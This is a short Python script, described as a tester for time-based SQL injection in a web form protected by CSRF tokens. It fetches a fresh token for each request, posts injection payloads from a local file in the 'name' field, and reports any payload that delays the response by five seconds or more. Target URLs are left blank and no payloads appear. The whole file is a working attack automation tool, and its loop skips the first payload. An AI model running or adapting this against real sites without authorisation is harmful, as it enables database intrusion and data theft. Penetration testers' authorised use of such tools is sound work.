"""
This script will test a web application for time based SQLi that also uses CSRF protection to protect the POST request.  
"""

import requests
from bs4 import BeautifulSoup

url = ''

def get_token():
    token_url = ''
    token_result = requests.get(token_url)
    return token_result.text 

with open('time_inject', 'r') as injections: 
    inject = injections.readline()
    cnt = 1 
    while inject:
        #print("Trying injection: {}".format(inject.strip()))
        inject = injections.readline()
        cnt += 1

        token = get_token()
        data = {'name':inject, 'mail':'test98%40test.com','token':token}
        result = requests.post(url, data)
        time = result.elapsed.total_seconds()
        if time >= 5:
            soup = BeautifulSoup(result.text, 'html.parser')
            print ("The injection used: {} :::::::: The response was {}".format(inject, soup.p.text))
